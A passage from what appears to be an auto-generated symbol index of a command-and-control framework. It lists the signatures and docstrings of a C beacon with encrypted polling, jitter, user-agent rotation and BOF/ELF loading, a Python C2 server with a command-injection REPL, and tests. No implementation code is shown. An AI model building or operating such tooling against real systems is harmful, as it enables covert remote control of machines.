- `next` (line 27) `extern "C" { #endif #if !defined(__WINDOWS__) && (defined(WIN32) || defined(WIN64) || defined(_MSC_VER) || defined(_WIN32)) #define __WINDOWS__ #endif #ifdef __WINDOWS__ /* When compiling for windows,` - *ifdef __cplusplus*

#### `config.h`
**Path:** `include/config.h`

**Functions:**
- `bsb_config_load` (line 77) `int bsb_config_load(const char *path, bsb_config_t *cfg, char *err, size_t errlen);` - *Load config from path. Returns 0 on success, -1 on error. * On error, leaves a human-readable message in `err` (if non-NULL).*
- `bsb_config_load_default` (line 80) `int bsb_config_load_default(bsb_config_t *cfg, char *err, size_t errlen);` - *Load config from path. Returns 0 on success, -1 on error. * On error, leaves a human-readable message in `err` (if non-NULL). int bsb_config_load(const char *path, bsb_config_t *cfg, char *err, size_t errlen); /* Load from BSB_CONFIG env or default path.*
- `bsb_config_sleep_seconds` (line 83) `int bsb_config_sleep_seconds(const bsb_config_t *cfg);` - *Load config from path. Returns 0 on success, -1 on error. * On error, leaves a human-readable message in `err` (if non-NULL). int bsb_config_load(const char *path, bsb_config_t *cfg, char *err, size_t errlen); /* Load from BSB_CONFIG env or default path. int bsb_config_load_default(bsb_config_t *cfg, char *err, size_t errlen); /* Compute a sleep duration with jitter applied. Returns seconds.*

**Macros:**
- `BSB_CONFIG_H` (line 14) `#define BSB_CONFIG_H`
- `BSB_CONFIG_PATH_DEFAULT` (line 18) `#define BSB_CONFIG_PATH_DEFAULT`
- `BSB_CONFIG_PATH_ENV` (line 20) `#define BSB_CONFIG_PATH_ENV`
- `BSB_MAX_URL` (line 21) `#define BSB_MAX_URL`
- `BSB_MAX_URI` (line 22) `#define BSB_MAX_URI`
- `BSB_MAX_CLIENT_ID` (line 23) `#define BSB_MAX_CLIENT_ID`
- `BSB_AES_KEY_HEX_LEN` (line 24) `#define BSB_AES_KEY_HEX_LEN`
- `BSB_AES_KEY_BYTES` (line 25) `#define BSB_AES_KEY_BYTES`
- `BSB_MAX_USER_AGENTS` (line 26) `#define BSB_MAX_USER_AGENTS`
- `BSB_USER_AGENT_LEN` (line 27) `#define BSB_USER_AGENT_LEN`
- `BSB_REPORT_URI_DEFAULT` (line 28) `#define BSB_REPORT_URI_DEFAULT`

**Structs:**
- `bsb_c2_t` (line 30)
- `bsb_crypto_t` (line 37)
- `bsb_timing_t` (line 42)
- `bsb_network_t` (line 49)
- `bsb_bof_t` (line 55)
- `bsb_backoff_config_t` (line 60)
- `bsb_config_t` (line 65)

### PY (11 files)

#### `app.py`
**Path:** `app.py`
**File Doc:** *_*_ coding: utf8 _*_*

*No symbols extracted*

#### `server.py`
**Path:** `c2/server.py`

**Classes:**
- `C2State` (line 136) `class C2State` - *Mutable state shared between request handlers.*

**Functions:**
- `load_runtime_config` (line 59) `def load_runtime_config()` - *Load configuration from JSON file or use defaults.*
- `compute_hmac` (line 86) `def compute_hmac(key, data)` - *Compute HMAC-SHA256 for message authentication.*
- `verify_hmac` (line 91) `def verify_hmac(key, data, signature)` - *Verify HMAC-SHA256 signature.*
- `encrypt_data` (line 97) `def encrypt_data(data, key, use_hmac)` - *Encrypt data with AES-256-CFB and optional HMAC.*
- `decrypt_data` (line 117) `def decrypt_data(b64_data, key, use_hmac)` - *Decrypt AES-256-CFB data with optional HMAC verification.*

**Methods:**
- `handle_get_command` (line 150) `def handle_get_command(state, selector)` - *Dispatch beacon's polling GET request.*
- `handle_report` (line 173) `def handle_report(state, b64_payload)` - *Process beacon result report.*
- `handle_bof` (line 229) `def handle_bof(state, name)` - *Serve BOF file from upload directory.*
- `handle_request` (line 239) `def handle_request(state, selector)` - *Route request to appropriate handler.*
- `serve_client` (line 272) `def serve_client(state, conn, addr)` - *Handle individual client connection.*
- `command_injector` (line 294) `def command_injector(state)` - *Interactive command injection REPL.*
- `main` (line 317) `def main()` - *Start C2 server.*
- `__init__` (line 139) `def __init__(self, cfg)`

#### `gopher_c2.py`
**Path:** `gopher_c2.py`

**Functions:**
- `encrypt_data` (line 28) `def encrypt_data(data)`
- `decrypt_data` (line 37) `def decrypt_data(b64_data)`
- `handle_client` (line 45) `def handle_client(conn, addr)`
- `main` (line 127) `def main()`
- `command_injector` (line 136) `def command_injector()`

#### `config_py.py`
**Path:** `include/config_py.py`

**Functions:**
- `_deep_merge` (line 55) `def _deep_merge(base, overlay)` - *Recursively merge overlay into base; overlay wins.*
- `load_config` (line 65) `def load_config(path)` - *Load and validate a BSB config file.

Raises ValueError on any schema violation. Returns a dict
matching DEFAULTS' structure.*

#### `test_beacon_build.py`
**Path:** `tests/test_beacon_build.py`

**Functions:**
- `have_headers` (line 20) `def have_headers()` - *Return True if openssl and curl headers are present.*
- `compile_beacon` (line 34) `def compile_beacon()`
- `inspect_binary` (line 50) `def inspect_binary()`
- `test_beacon_compiles_and_links` (line 55) `def test_beacon_compiles_and_links()`
- `test_beacon_exposes_bof_api` (line 64) `def test_beacon_exposes_bof_api()`
- `test_beacon_exposes_elf_loader` (line 85) `def test_beacon_exposes_elf_loader()`
- `main` (line 96) `def main()`

#### `test_bof_compile.py`
**Path:** `tests/test_bof_compile.py`

**Functions:**
- `compile_bof` (line 21) `def compile_bof(name)`
- `inspect_symbols` (line 35) `def inspect_symbols(obj_path)`
- `test_compile_all` (line 53) `def test_compile_all()`
- `test_export_go` (line 60) `def test_export_go()`
- `test_unresolved_beacon_api` (line 68) `def test_unresolved_beacon_api()`
- `test_no_libc_leak` (line 80) `def test_no_libc_leak()` - *Make sure we did not pull in glibc symbols by accident.*
- `main` (line 91) `def main()`

#### `test_c2_http_e2e.py`
**Path:** `tests/test_c2_http_e2e.py`

**Functions:**
- `_free_port` (line 43) `def _free_port()`
- `_recv_response` (line 51) `def _recv_response(sock, timeout)`
- `test_http_get_poll_returns_encrypted_command` (line 65) `def test_http_get_poll_returns_encrypted_command()` - *Beacon-style HTTP/1.1 GET /<uri>/<id> must return a base64
body the server can encrypt and we can decrypt with the shared
AES key. Before the fix, the server returned iUNKNOWN_SELECTOR.*
- `test_http_post_report_writes_log` (line 115) `def test_http_post_report_writes_log()` - *Beacon-style HTTP/1.1 POST /report/<b64> must reach the
report handler, decrypt, parse, and write a CSV row. Before
the fix, the POST went to the same URL as the GET (poll),
so the server logged an UNKNOWN_SELECTOR error and the
CSV never had a row for this client.*
- `test_gopher_legacy_still_works` (line 183) `def test_gopher_legacy_still_works()` - *The old Gopher-style selector (single line, CRLF) must
still dispatch correctly — server.py keeps that path so
anything that depended on it is not broken by the new
HTTP/1.1 entry point.*
- `test_http_post_with_url_encoded_b64_payload` (line 233) `def test_http_post_with_url_encoded_b64_payload()` - *The beacon percent-encodes the base64 payload before
splicing it onto the URL path. Standard base64 uses '+',
'/', and '=' which would otherwise produce an invalid
HTTP request line (extra '/' would split the path, '+'
is space-encoded, '=' is a query marker). This test
replicates that: encode the payload exactly as the
beacon does, send it, and assert the report is decrypted
and logged.*
- `test_fragmented_post_is_dispatched_as_http` (line 326) `def test_fragmented_post_is_dispatched_as_http()` - *When the client sends a long POST URL that crosses a TCP
segment boundary, the first recv() inside server.serve() may
not include "HTTP/1.1" yet. Before the _read_http_request
fix, this made the dispatcher fall through to the legacy
Gopher branch and return iUNKNOWN_SELECTOR. We reproduce that
fragmentation here by sending the request in two pieces with
a small delay between them. The expected behavior is that the
server still parses the full request, decrypts, and writes
the log line.*
- `main` (line 399) `def main()`
- `encode` (line 274) `def encode(s)`

#### `test_c2_server.py`
**Path:** `tests/test_c2_server.py`

**Functions:**
- `make_state` (line 39) `def make_state(tmp)`
- `test_get_command_empty` (line 46) `def test_get_command_empty()`
- `test_get_command_queued` (line 58) `def test_get_command_queued()`
- `test_report_writes_log` (line 69) `def test_report_writes_log()`
- `test_bof_not_found` (line 85) `def test_bof_not_found()`
- `test_bof_serves_existing_file` (line 92) `def test_bof_serves_existing_file()`
- `test_unknown_selector` (line 104) `def test_unknown_selector()`
- `test_path_traversal_in_bof_name` (line 111) `def test_path_traversal_in_bof_name()` - *Path-traversal in /bof/ should be neutralised by os.path.basename.*
- `test_roundtrip_empty` (line 120) `def test_roundtrip_empty()` - *encrypt then decrypt empty payload must yield single NUL byte.*
- `test_roundtrip_text` (line 127) `def test_roundtrip_text()`
- `main` (line 134) `def main()`

#### `test_config.py`
**Path:** `tests/test_config.py`

**Functions:**
- `compile_harness` (line 24) `def compile_harness()` - *Build the test harness against config.c.*
- `run_harness` (line 38) `def run_harness(config_text)` - *Write a config file, run the harness, return parsed output.*
- `test_default_load` (line 55) `def test_default_load()`
- `test_overrides` (line 73) `def test_overrides()`
- `test_missing_file` (line 90) `def test_missing_file()`
- `test_search_order_env_wins` (line 98) `def test_search_order_env_wins()` - *$BSB_CONFIG must take precedence over the binary-relative path.*
- `test_search_order_falls_back_to_cwd_default` (line 115) `def test_search_order_falls_back_to_cwd_default()` - *With BSB_CONFIG unset, the harness resolves to ./config.json
(the binary-relative lookup is irrelevant in the harness because
the harness lives in tests/, not next to a config.json).*
- `test_bad_hex_key` (line 141) `def test_bad_hex_key()`
- `main` (line 156) `def main()`

#### `test_crypto.py`
**Path:** `tests/test_crypto.py`

**Functions:**
- `compile_harness` (line 18) `def compile_harness()`
- `run` (line 32) `def run(plaintext, key_hex)`
- `test_short` (line 40) `def test_short()`
- `test_block_boundary` (line 44) `def test_block_boundary()`
- `test_longer_than_block` (line 49) `def test_longer_than_block()`
- `test_known_ciphertext` (line 55) `def test_known_ciphertext()`
- `test_python_can_decrypt_c_ciphertext` (line 74) `def test_python_can_decrypt_c_ciphertext()` - *The Python C2 server must be able to decrypt C-encrypted
commands. We feed a known key+plaintext through the C harness,
extract the ciphertext, then decrypt with Python and check we
recover the original plain.*
- `main` (line 107) `def main()`

#### `test_install_deploy.py`
**Path:** `tests/test_install_deploy.py`

**Functions:**
- `make_all` (line 23) `def make_all()` - *Clean and build everything, return nothing.*
- `run_beacon` (line 29) `def run_beacon(binary, cwd)`
- `test_build_beacon_lands_alongside_config` (line 42) `def test_build_beacon_lands_alongside_config()` - *The point of this whole iteration: `make beacon` leaves
a runnable binary with its config next to it, no env vars
or extra steps required.*
- `test_staged_files_have_correct_modes` (line 53) `def test_staged_files_have_correct_modes()`
- `test_staged_beacon_runs_from_any_cwd` (line 61) `def test_staged_beacon_runs_from_any_cwd()` - *Drop the operator in /tmp; the staged beacon should still
find build/config.json via the binary-relative search path.*
- `test_staged_bofs_are_present` (line 74) `def test_staged_bofs_are_present()`
- `test_clean_removes_everything` (line 82) `def test_clean_removes_everything()` - *make clean must wipe build/ — including the staged config.json —
but leave config/config.json (the operator's copy) alone.

This is the last test that runs, so we leave the operator with a
fresh deliverable tree afterwards. `make clean` is destructive
and the operator's only copy of build/ is whatever the previous
test left behind; rebuilding here guarantees `./build/beacon`
and the staged BOFs are present after `make test` finishes.*
- `main` (line 104) `def main()`

### SH (1 files)

#### `install.sh`
**Path:** `install.sh`
**File Doc:** *install.sh - Install build deps and build everything.  Idempotent: safe to run on a fresh checkout. Tested on Debian 12 and Ubuntu 22.04.  For day-to-day development, prefer running `make` directly so errors are reported per-target. This script is for first-time setup and CI parity.*

*No symbols extracted*
